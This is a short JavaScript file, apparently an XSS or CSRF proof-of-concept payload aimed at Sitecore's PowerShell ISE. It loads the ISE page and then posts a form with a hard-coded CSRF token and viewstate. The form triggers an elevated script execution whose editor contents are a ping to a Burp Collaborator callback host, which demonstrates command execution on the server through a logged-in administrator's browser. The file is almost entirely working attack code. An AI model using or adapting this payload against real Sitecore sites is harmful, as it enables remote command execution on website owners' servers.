var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1',true);
req.send();
function handleResponse() {
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1', true);
    changeReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    changeReq.send('&__PARAMETERS=ise%3Aexecute%28elevationResult%3D1%29%28elevationResult%3D1%29&__EVENTTARGET=&__EVENTARGUMENT=&__SOURCE=&__EVENTTYPE=&__CONTEXTMENU=&__MODIFIED=&__ISEVENT=1&__CSRFTOKEN=AAEAAAD%2F%2F%2F%2F%2FAQAAAAAAAAAGAQAAACRkNDQ5M2JhMy02Njk5LTQwOGMtYjVlZC02NjAyM2IyNjZkNzAL&__VIEWSTATE=4F6E4F787B9E4D6CBA10FECF5C08B148&__VIEWSTATE=&scActiveRibbonStrip=&scGalleries=&SelectionText=&SelectionRange=&Breakpoints=&Editor=ping%20qqk64ali9cib53whxp4lputw2n8e72w.burpcollaborator.net')
};
